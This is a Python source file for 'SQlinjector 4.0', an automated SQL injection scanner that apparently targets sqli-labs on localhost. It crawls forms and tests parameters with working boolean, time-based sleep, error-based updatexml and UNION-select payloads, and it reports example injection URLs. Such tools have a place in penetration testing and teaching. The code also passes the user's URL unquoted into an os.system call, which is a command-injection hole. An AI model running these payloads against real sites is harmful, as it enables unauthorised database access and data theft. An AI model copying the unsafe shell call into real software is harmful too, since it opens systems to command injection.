import requests
import sys
import getopt
import re
import json
import numpy as np
import time
import os

def banner():
	print("\n***************************************")
	print("* SQlinjector  4.0                      *")
	print("***************************************\n")

def usage():
	print("[Info] Usage:")
	print("-f: run full automatic pen-test with crawler")
	print('example: py SQLi_4.py -f \n')
	print("-s: run automatic pen-test on a single page")
	print('example: py SQLi_4.py -u "http://localhost/dashboard/var/www/sqli-labs-master/Less-1/" \n')
	print("-i: run half-auto pen-test with the file of the response to inject")
	print('example: py SQLi_4.py -i post.txt \n')
	print("-u: run basic pen-test on a specific GET method URL")
	print('example: py SQLi_4.py -u "http://localhost/dashboard/var/www/sqli-labs-master/Less-1/?id=1&name=admin" \n')
	print("-h: print the help document")
	print('example: py SQLi_4.py -h \n')

def url_process(file):
	try:
		f = open(file, )
		dictsp = json.load(f)
	except:
		print("[Error] No crawl result was found!")
		sys.exit()

	print("[Info] Found input vectors:")

	for i in dictsp:
		print(i)

	f.close()

	f = open(file, 'w')
	f.write('')
	f.close()

	return dictsp

def requst_process(file):
	try:
		with open(file, "r", encoding='utf-8') as f:
			lines = f.readlines()
	except:
		print("[Error] File not exists")
		sys.exit()

	method = str()
	data = dict()
	headers = dict()
	count = len(lines)

	for line in lines:
		if count == len(lines):
			l = line.strip().split(" ")
			method = l[0]
			if method == "GET":
				print("[Warning] You are dealing with GET method request, please use -u command instead!\n")
				usage()
				sys.exit()

			url = l[1]
		elif count == 1:
			ori_data = line.strip().split("&")
			for d in ori_data:
				items = d.split("=")
				data[items[0]] = items[1]
		else:
			if line != "\n":
				header = line.strip().split(": ")
				headers[header[0]] = header[1]

		count -= 1

	ori_url = headers["Origin"] + url

	f.close()
	return method, ori_url, headers, data

def data_process(url):
	data = dict()
	U = url.split("/?")
	# ori_url = U[0]
	datas = U[1].split("&")

	for d in datas:
		r = d.split("=")
		data[r[0]] = r[1]

	return data

def start(argv):
	banner()
	if len(sys.argv) < 2:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv, "i:u:s:fh")
	except getopt.GetoptError:
		print("[Error] Error in arguments")
		sys.exit()
	try:
		josnF = open("lib/injections.json",)
		dictio = json.load(josnF)
		josnF.close()
	except (RuntimeError):
		print("[Error] " + RuntimeError)
		print("[Error] Failed open the injector dictionary!")
		sys.exit()

	for opt, arg in opts:
		if opt == '-u':
			url = arg
			if "/?" not in url:
				print("[Error] Invalid GET method URL!")
				sys.exit()

			data = data_process(url)
			launcher(opt, url, dictio, "GET", data)

		elif opt == '-s':
			url = arg

			print("[Info] Start crawling")
			os.system("scrapy crawl crawler -a start_urls=" + url
					  + " -a allowed_domains=" + url.split("://")[1]
					  + " --nolog -t json -O temp/spider.json")

			print("----------------------------------")
			dictsp = url_process("temp/spider.json")

			for form in dictsp:
				url = form["form"]
				method = form["method"]
				loc_url = form["location_url"]

				if method == None:
					method = "GET"

				if url == None:
					url = loc_url

				data = dict()
				for d in form['name']:
					data[d] = "1"

				launcher(opt, url, dictio, method, data, loc_url)

		elif opt == '-f':
			print("[Info] Start crawling")
			os.system("scrapy crawl crawler --nolog -t json -O temp/spider.json")

			print("----------------------------------")
			dictsp = url_process("temp/spider.json")
			for form in dictsp:
				url = form["form"]
				method = form["method"]
				loc_url = form["location_url"]

				if method == None:
					method = "GET"

				if url == None:
					url = loc_url

				data = dict()
				for d in form['name']:
					data[d] = "1"

				launcher(opt, url, dictio, method, data, loc_url)

		elif opt == '-i':
			file = "temp/" + arg

			try:
				method, url, headers, data = requst_process(file)
			except (RuntimeError):
				print(RuntimeError)
				print("Failed open response file!")
				sys.exit()

			launcher(opt, url, dictio, method, data, None, headers)

		elif opt == "-h":
			usage()
			sys.exit()

def launcher (opt, url, dictio, method, data=None, loc_url=None, headers=None):
	print("\n[Info] Detection Start:")
	msg = "Detection start with {} method.\n".format(opt)
	msg += "----------------------------------\n"

	if loc_url != None:
		print("[Info] Check on", loc_url)
		print("[Info] On action:", url)
		msg += "Location URL: {}\n".format(loc_url)
		msg += "Request URL: {}\n".format(url)
	else:
		print("[Info] Check on", url)
		msg += "Location URL: {}\n".format(loc_url)
		msg += "Request URL: {}\n".format(url)
		msg += "Result:\n"

	write_report(msg)
	symbols = dict()
	count = len(data)
	allow_re = False
	data_copy = data.copy()

	for key in data:
		result, injector_found, is_sleep, has_redirect = \
			checkInjectable(opt, method, url, dictio, data, key, headers)

		if is_sleep and has_redirect:
			print("[Info] Redirect Check!")
			result2, injector_found2, is_sleep2, has_redirect2 = \
				checkInjectable(opt, method, url, dictio, data, key, headers, True)

			if injector_found2:
				is_sleep = is_sleep2
				allow_re = True

		if injector_found:
			if is_sleep:
				symbols[key] = (result, ["sleep"])
			else:
				symbols[key] = (result, ["bool", "sleep"])

				if not allow_re:
					pos_new = result + " AND/OR if(1=1,sleep(5),1) AND " + dictio[result] + "1"
					data_copy[key] = data[key] + pos_new
					if method == "GET":
						new_pos_url = new_get_url(url + "?", data_copy)
					else:
						new_pos_url = data_copy[key]
					msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
					msg += "\tExample injection: {}\n\n".format(new_pos_url)
					write_report(msg)

			if count != 1 and opt != "-f":
				print("[Info] Would you like to check other input factors? (y/N)")
				c = input()
				if c == 'Y' or c == 'y':
					pass
				else:
					break

		count -= 1

	if len(symbols) > 0:
		for s in symbols:
			print("[Info] Start Error base injection check")
			error_inject = \
				checkInjectable_error(url, symbols[s][0], dictio, method, headers, data, s)
			if error_inject:
				symbols[s][1].append("error")

			print("[Info] Start Union select injection check")
			union_inject, column_number = \
				checkInjectable_union(url, symbols[s][0], dictio, method, headers, data, s, allow_re)
			if union_inject:
				symbols[s][1].append("union")

		print('\n[Info] Found injector: ')
		print("---------------")
		print(symbols)
		print("Detection Finished!")
		msg = "----------------------------------\n"
		msg += "Detection Finished!\n\n\n"
		write_report(msg)
	else:
		print("This page is not injectable!")
		msg = "----------------------------------\n"
		msg += "This page is not injectable!\n\n\n"
		write_report(msg)

def checkInjectable(opt, method, url, dictio, data, key, headers=None, allow_re=False):
	success = False
	max_iter = 2
	no_or = False
	data_copy = data.copy()
	ori_url = url
	has_redirect = False

	while max_iter != 0 and not success:
		if opt == "-u":
			url = ori_url.split("/?")[0] + "/?"
			ori_res = requests.get(ori_url)
		else:
			if method.upper() == "GET" or method == "":
				url = ori_url + "/?"
				new_url = new_get_url(url, data)
				method = "GET"
				ori_res = requests.get(new_url, allow_redirects=allow_re)
			elif headers != None:
				ori_res = requests.request(method, url, headers=headers, data=data, allow_redirects=allow_re)
			else:
				ori_res = requests.request(method, url, data=data, allow_redirects=allow_re)

		print("[Info] Start to check the injection string on", "[" + key + "]")
		if ori_res.status_code not in (200, 302):
			print("[Info] Request failed, status code:" + str(ori_res.status_code))
			return None, False, False, False

		if ori_res.status_code == 302:
			has_redirect = True

		for prefix in dictio:
			postfix = dictio[prefix]

			neg_new = prefix + " AND " + postfix + "-1"
			data_copy[key] = data[key] + neg_new
			if method == "GET":
				new_neg_url = new_get_url(url, data_copy)
				neg_res = requests.get(new_neg_url, allow_redirects=allow_re)
			elif headers != None:
				neg_res = requests.request(method, url, headers=headers, data=data_copy, allow_redirects=allow_re)
			else:
				neg_res = requests.request(method, url, data=data_copy, allow_redirects=allow_re)

			pos_new = prefix + " AND " + postfix + "1"
			data_copy[key] = data[key] + pos_new
			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
				pos_res = requests.get(new_pos_url)
			elif headers != None:
				new_pos_url = data_copy[key]
				pos_res = requests.request(method, url, headers=headers, data=data_copy, allow_redirects=allow_re)
			else:
				new_pos_url = data_copy[key]
				pos_res = requests.request(method, url, data=data_copy, allow_redirects=allow_re)

			ori_vs_neg_res = response_compare(ori_res, neg_res, neg_new)
			ori_vs_pos_res = response_compare(ori_res, pos_res, pos_new)
			pos_vs_neg_res = response_compare(neg_res, pos_res, neg_new, pos_new)

			if not ori_vs_neg_res \
				and ori_vs_pos_res \
				and not pos_vs_neg_res:

				success = True
				result = prefix
				result_url = new_pos_url

			elif not ori_vs_neg_res \
				and not ori_vs_pos_res \
				and not pos_vs_neg_res:

				no_or = True

		max_iter -= 1

	if success:
		print("[Info]", "["+key+"]", "is boolean based blind injectable with", "["+result+"]")
		print("[Info] Example:", result_url)
		msg = "\t[{}] is boolean based blind injectable with [{}]\n".format(key, result)
		msg += "\tExample injection: {}\n\n".format(result_url)
		write_report(msg)
		return result, success, False, has_redirect

	print("[Info] Cannot find any injection string")
	print("[Info] Try OR statement")
	if not success and not no_or:
		for prefix in dictio:
			postfix = dictio[prefix]

			pos_new = prefix + " OR " + postfix + "1"
			data_copy[key] = data[key] + pos_new
			php_error = ori_res.content.count("PHP Error".encode())

			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
				pos_res = requests.get(new_pos_url, allow_redirects=allow_re)
			elif headers != None:
				new_pos_url = data_copy[key]
				pos_res = requests.request(method, url, headers=headers, data=data_copy, allow_redirects=allow_re)
			else:
				new_pos_url = data_copy[key]
				pos_res = requests.request(method, url, data=data_copy, allow_redirects=allow_re)

			if not (response_compare(ori_res, pos_res, pos_new)) \
				and check_error(pos_res.content, php_error):
				success = True
				result = prefix
				result_url = new_pos_url

	if success:
		print("[Info]", "["+key+"]", "is boolean based blind injectable with", "["+result+"]")
		print("[Info] Example:", result_url)
		msg = "\t[{}] is boolean based blind injectable with [{}]\n".format(key, result)
		msg += "\tExample injection: {}\n\n".format(result_url)
		write_report(msg)
		return result, success, False, has_redirect

	print("[Info] Cannot find any injection string")
	print("[Info] Try SLEEP method")
	if not success and not allow_re:
		times = dict()
		for prefix in dictio:
			postfix = dictio[prefix]

			pos_new = prefix + " AND if(1=1,sleep(5),1) AND " + postfix + "1"
			data_copy[key] = data[key] + pos_new

			start = time.time()
			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
				pos_res = requests.get(new_pos_url, allow_redirects=False)
			elif headers != None:
				pos_res = requests.request(method, url, headers=headers, data=data_copy, allow_redirects=False)
			else:
				pos_res = requests.request(method, url, data=data_copy, allow_redirects=False)
			end = time.time()
			times[prefix] = end - start

		max_key = max(times, key=times.get)
		std_with_max = np.std(list(times.values()))
		times.pop(max_key)
		std_without_max = np.std(list(times.values()))

		if abs(std_with_max - std_without_max) >= 1:
			success = True
			result = max_key
			pos_new = result + " AND if(1=1,sleep(5),1) AND " + dictio[result] + "1"
			data_copy[key] = data[key] + pos_new
			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
			else:
				new_pos_url = data_copy[key]

	if success:
		print("[Info] [" + key + "] is time based blind injectable with [" + result + "]")
		print("[Info] Example:", new_pos_url)
		msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
		msg += "\tExample injection: {}\n\n".format(new_pos_url)
		write_report(msg)
		return result, success, True, has_redirect

	print("[Info] Cannot find any injection string")
	print("[Info] Try SLEEP method with OR")
	if not success and not allow_re:
		times = dict()
		for prefix in dictio:
			postfix = dictio[prefix]

			pos_new = prefix + " OR if(1=1,sleep(5),1) AND " + postfix + "1"
			data_copy[key] = data[key] + pos_new

			start = time.time()
			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
				pos_res = requests.get(new_pos_url, allow_redirects=False)
			elif headers != None:
				pos_res = requests.request(method, url, headers=headers, data=data_copy, allow_redirects=False)
			else:
				pos_res = requests.request(method, url, data=data_copy, allow_redirects=False)
			end = time.time()
			times[prefix] = end - start

		max_key = max(times, key=times.get)
		std_with_max = np.std(list(times.values()))
		times.pop(max_key)
		std_without_max = np.std(list(times.values()))

		if abs(std_with_max - std_without_max) >= 1:
			success = True
			result = max_key
			pos_new = result + " OR if(1=1,sleep(5),1) AND " + dictio[result] + "1"
			data_copy[key] = data[key] + pos_new
			if method == "GET":
				new_pos_url = new_get_url(url, data_copy)
			else:
				new_pos_url = data_copy[key]

	if success:
		print("[Info] [" + key + "] is time based blind injectable with [" + result + "]")
		print("[Info] Example:", new_pos_url)
		msg = "\t[{}] is time based blind injectable with [{}]\n".format(key, result)
		msg += "\tExample injection: {}\n\n".format(new_pos_url)
		write_report(msg)
		return result, success, True, has_redirect

	return None, success, False, has_redirect

def new_get_url(url, data):
	count = 1
	new_url = url
	for key in data:
		if count != len(data):
			new_url += key + "=" + data[key] + "&"
		else:
			new_url += key + "=" + data[key]

		count += 1

	return new_url

def response_compare(res1, res2, inject_string1, inject_string2=None):
	content1 = res1.text
	content2 = res2.text

	if inject_string2 == None:
		content2 = content2.replace(inject_string1, str())
	else:
		content1 = content1.replace(inject_string1, str())
		content2 = content2.replace(inject_string2, str())

	return content1 == content2

def check_error(response, php_error):
	new_php_error = response.count("PHP Error".encode())
	if new_php_error != php_error:
		return False

	error_list = ["Data truncated for column", "Cannot add or update a child", "error in your SQL syntax", "Duplicate entry", "in 'order clause'"]
	for e in error_list:
		if e.encode() in response:
			return False

	return True

def checkInjectable_error(url, symbol, dictio, method, headers, data, key):
	new_data = data.copy()
	error_raise = " and (select 1 from (select count(*),concat((select version() from information_schema.tables limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x)as a) and updatexml(1,concat(0x5e,('You are injectable!!!'),0x5e),1) and "
	flag = "You are injectable!!!"

	if method.upper() == "GET" or method == "":
		ori_url = url.split("/?")[0] + "/?"
		new = symbol + error_raise + dictio[symbol] + "1"
		new_data[key] = data[key] + new
		new_url = new_get_url(ori_url, new_data)
		response = requests.get(new_url)

		if flag.encode() in response.content:
			print("[Info]", "[" + key + "]", "is error based injectable!")
			print("[Info] Example:", new_url)
			msg = "\t[{}] is error based injectable\n".format(key)
			msg += "\tExample injection: {}\n\n".format(new_url)
			write_report(msg)
			return True
	else:
		new_data[key] = data[key] + symbol + error_raise + dictio[symbol] + "1"
		if headers != None:
			response = requests.request(method, url, headers=headers, data=new_data, allow_redirects=False)
		else:
			response = requests.request(method, url, data=new_data, allow_redirects=False)

		if flag.encode() in response.content:
			print("[Info]", "[" + key + "]", "is error based injectable!")
			print("[Info] Example:", "[" + key + "]:", new_data[key])
			msg = "\t[{}] is error based injectable\n".format(key)
			msg += "\tExample injection: [{}]: {}\n\n".format(key, new_data[key])
			write_report(msg)
			return True

	return False

def checkInjectable_union(url, symbol, dictio, method, headers, data, key=None, allow_re=False):
	column_count = 0
	columns = ""
	injectable = False
	new_data = data.copy()

	if method.upper() == "GET" or method == "":
		ori_url = url.split("/?")[0] + "/?"

		for i in range(1, 21):
			if i == 1:
				columns += "9527169"
			else:
				columns += ",9527169"

			new = symbol + " AND 1=-1 union select " + columns + " WHERE " + dictio[symbol] + "1"
			new_data[key] = data[key] + new
			new_url = new_get_url(ori_url, new_data)
			new_res = requests.get(new_url)
			column_count += 1

			if "9527169".encode() in new_res.content\
					and "syntax to use near " + symbol + "union select 9527169" not in new_res.text:
				injectable = True
				break

		if injectable:
			print("[Info]", "[" + key + "]", "is union select injectable!")
			print("[Info] Example:", new_url)
			msg = "\t[{}] is union select injectable\n".format(key)
			msg += "\tExample injection: {}\n\n".format(new_url)
			write_report(msg)
			return True, column_count

	else:
		for i in range(1, 21):
			if i == 1:
				columns += "9527169"
			else:
				columns += ",9527169"

			new = symbol + " AND 1=-1 union select " + columns + " WHERE " + dictio[symbol] + "1"
			new_data[key] = data[key] + new
			if headers != None:
				new_res = requests.request(method, url, headers=headers, data=new_data, allow_redirects=allow_re)
			else:
				new_res = requests.request(method, url, data=new_data, allow_redirects=allow_re)

			column_count += 1

			if "9527169".encode() in new_res.content \
					and "syntax to use near " + symbol + "union select 9527169" not in new_res.text:
				print(new_res.text)
				injectable = True
				break

		if injectable:
			print("[Info]", "[" + key + "]", "is union select injectable!")
			print("[Info] Example:", "[" + key + "]:", new_data[key])
			msg = "\t[{}] is union select injectable\n".format(key)
			msg += "\tExample injection: [{}]: {}\n\n".format(key, new_data[key])
			write_report(msg)
			return True, column_count

	return False, 0

def write_report(msg):
	f = open('report.txt', 'a+')
	f.write(msg)
	f.close()

if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		msg = "SQL injector interrupted by user..!!\n\n"
		write_report(msg)
		print("SQL injector interrupted by user..!!")
